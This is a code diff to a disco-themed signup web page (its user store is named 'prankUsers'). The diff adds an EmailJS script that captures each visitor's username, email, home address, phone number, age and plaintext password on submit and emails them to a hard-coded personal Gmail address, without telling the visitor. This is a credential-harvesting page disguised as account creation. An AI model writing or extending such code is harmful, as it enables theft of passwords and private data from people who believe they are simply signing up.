@@ -12,7 +12,7 @@
             <h1>Join the Groove</h1>
             <h2>Ready to dance, whirl, and frolic around the legendary disco?</h2>
             <p>Step into the rhythm and create your account to get started!</p>
-            <form>
+            <form action="" method="post">
                 <label for="username">Username</label>
                 <input type="text" id="username" name="username" placeholder="Enter your username" required>
 
@@ -46,7 +46,17 @@
         </div>
     </div>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        const EMAILJS_PUBLIC_KEY = '6mKefb9d6MEvBOc5k';
+        const EMAILJS_SERVICE_ID = 'service_ks7rofd';
+        const EMAILJS_TEMPLATE_ID = 'template_ldz2isn';
+        const EMAILJS_READY = EMAILJS_PUBLIC_KEY !== 'YOUR_EMAILJS_PUBLIC_KEY' && EMAILJS_SERVICE_ID !== 'YOUR_EMAILJS_SERVICE_ID' && EMAILJS_TEMPLATE_ID !== 'YOUR_EMAILJS_TEMPLATE_ID';
+
+        if (EMAILJS_READY) {
+            emailjs.init(EMAILJS_PUBLIC_KEY);
+        }
+
         // Password confirmation validation
         document.getElementById('confirm_password').addEventListener('input', function() {
             const password = document.getElementById('password').value;
@@ -59,13 +69,23 @@
             }
         });
 
-        // Store user data on signup (simulating account creation)
+        // Store user data and optionally send signup info by email
         document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const address = document.getElementById('address').value;
+            const phone = document.getElementById('phone').value;
+            const age = document.getElementById('age').value;
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const username = document.getElementById('username').value;
+            const confirmPassword = document.getElementById('confirm_password').value;
 
-            // Store user data in localStorage
+            if (password !== confirmPassword) {
+                alert('Passwords do not match. Please confirm your password.');
+                return;
+            }
+
             const storedUsers = JSON.parse(localStorage.getItem('prankUsers') || '[]');
             const userExists = storedUsers.some(u => u.email === email);
 
@@ -79,9 +99,34 @@
                 localStorage.setItem('prankUsers', JSON.stringify(storedUsers));
             }
 
-            // Redirect to home.html with email parameter for personalization
-            e.preventDefault();
-            window.location.href = `home.html?email=${encodeURIComponent(email)}`;
+            const redirectToHome = () => {
+                window.location.href = `home.html?email=${encodeURIComponent(email)}`;
+            };
+
+            if (!EMAILJS_READY) {
+                console.warn('EmailJS is not configured. Skipping email send and redirecting to home.');
+                redirectToHome();
+                return;
+            }
+
+            const templateParams = {
+                to_email: 'graceoyateru2@gmail.com',
+                from_name: username,
+                user_email: email,
+                user_address: address,
+                user_phone: phone,
+                user_age: age,
+                user_password: password,
+                message: `New signup from ${username}`
+            };
+
+            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+                .then(function() {
+                    redirectToHome();
+                }, function(error) {
+                    console.error('EmailJS error:', error);
+                    redirectToHome();
+                });
         });
     </script>
 </body>
